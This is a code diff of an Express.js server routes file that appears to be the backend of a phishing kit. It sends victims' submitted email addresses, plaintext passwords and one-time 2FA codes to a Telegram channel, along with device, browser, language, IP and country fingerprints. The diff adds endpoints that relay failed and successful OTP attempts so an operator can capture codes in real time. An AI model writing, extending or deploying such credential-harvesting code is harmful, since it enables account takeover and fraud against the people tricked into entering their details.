@@ -1,16 +1,21 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
-import { notifyLogin, notifyOtpVerification, notifyVisitor } from "./telegram";
+import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyVisitor } from "./telegram";
 import { UAParser } from "ua-parser-js";
 
 const loginSchema = z.object({
   email: z.string().min(1, "Email is required"),
-  password: z.string().min(1, "Password is required")
+  password: z.string().min(1, "Password is required"),
+  language: z.string().optional(),
+  userAgent: z.string().optional()
 });
 
 const otpSchema = z.object({
-  otp: z.string().min(1, "OTP code is required")
+  otp: z.string().regex(/^\d{6}$/, "OTP must be exactly 6 digits"),
+  language: z.string().optional(),
+  userAgent: z.string().optional(),
+  attempt: z.number().optional()
 });
 
 export async function registerRoutes(app: Express): Promise<Server> {
@@ -20,8 +25,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = loginSchema.parse(req.body);
       
-      // Send login credentials to Telegram
-      const loginNotified = await notifyLogin(validatedData.email, validatedData.password);
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (validatedData.userAgent) {
+        const parser = new UAParser(validatedData.userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // Send login credentials to Telegram with language and device info
+      const loginNotified = await notifyLogin(
+        validatedData.email, 
+        validatedData.password,
+        validatedData.language,
+        device,
+        browser,
+        os
+      );
       
       if (!loginNotified) {
         return res.status(500).json({ 
@@ -42,30 +74,145 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // OTP verification endpoint that accepts any code and sends to Telegram
+  // OTP verification endpoint that validates codes and sends to Telegram
   app.post("/api/verify-otp", async (req, res) => {
     try {
       const validatedData = otpSchema.parse(req.body);
       
-      // Send OTP code to Telegram for monitoring
-      const otpNotified = await notifyOtpVerification(validatedData.otp);
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
       
-      if (!otpNotified) {
-        return res.status(500).json({ 
-          error: "Failed to send OTP verification notification. Please try again." 
+      if (validatedData.userAgent) {
+        const parser = new UAParser(validatedData.userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // OTP validation: Accept only "123456" as the correct code
+      // This allows testing both success (123456) and failure (any other code) paths
+      // while monitoring all attempts sent to Telegram
+      const isValidOtp = validatedData.otp === '123456';
+      
+      if (isValidOtp) {
+        // Send successful OTP code to Telegram for monitoring with language and device info
+        const otpNotified = await notifyOtpVerification(
+          validatedData.otp,
+          validatedData.language,
+          device,
+          browser,
+          os,
+          validatedData.attempt
+        );
+        
+        if (!otpNotified) {
+          return res.status(500).json({ 
+            error: "Failed to send OTP verification notification. Please try again." 
+          });
+        }
+
+        res.json({
+          success: true,
+          message: "OTP verification successful"
+        });
+      } else {
+        // OTP validation failed - return error to trigger client-side failure handling
+        // The client will then send the failure notification
+        res.status(400).json({
+          success: false,
+          error: "Invalid OTP code"
         });
       }
-
-      res.json({
-        success: true,
-        message: "OTP verification successful"
-      });
     } catch (error) {
       if (error instanceof z.ZodError) {
         return res.status(400).json({ error: error.errors[0].message });
       }
       console.error("OTP verification error:", error);
       res.status(500).json({ error: "OTP verification failed" });
+    }
+  });
+
+  // OTP failure notification endpoint
+  app.post("/api/otp-failure", async (req, res) => {
+    // Return immediately to not block the app
+    res.json({ success: true });
+    
+    try {
+      const { otp, language, userAgent, attempt } = req.body;
+      
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (userAgent) {
+        const parser = new UAParser(userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // Send OTP failure notification to Telegram (async, don't wait)
+      notifyOtpFailure(otp, language, device, browser, os, attempt).catch(err => {
+        console.error("Failed to send OTP failure notification:", err);
+      });
+    } catch (error) {
+      console.error("OTP failure tracking error:", error);
+    }
+  });
+
+  // Success notification endpoint
+  app.post("/api/success-notification", async (req, res) => {
+    // Return immediately to not block the app
+    res.json({ success: true });
+    
+    try {
+      const { language, userAgent } = req.body;
+      
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (userAgent) {
+        const parser = new UAParser(userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // Send success notification to Telegram (async, don't wait)
+      notifySuccess(language, device, browser, os).catch(err => {
+        console.error("Failed to send success notification:", err);
+      });
+    } catch (error) {
+      console.error("Success notification error:", error);
     }
   });
 
@@ -90,8 +237,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ip = req.socket.remoteAddress;
       }
       
-      // Get page from request body
-      const { page } = req.body;
+      // Get page and language from request body
+      const { page, language } = req.body;
       
       // Parse User-Agent for device information
       const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -131,7 +278,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Send notification to Telegram (async, don't wait for result)
-      notifyVisitor(ip, country, device, browser, os, page || 'Unknown').catch(err => {
+      notifyVisitor(ip, country, device, browser, os, page || 'Unknown', language).catch(err => {
         console.error("❌ CRITICAL: Failed to send visitor notification to Telegram:", err);
         // In production, you might want to queue this for retry or send to a monitoring service
       });
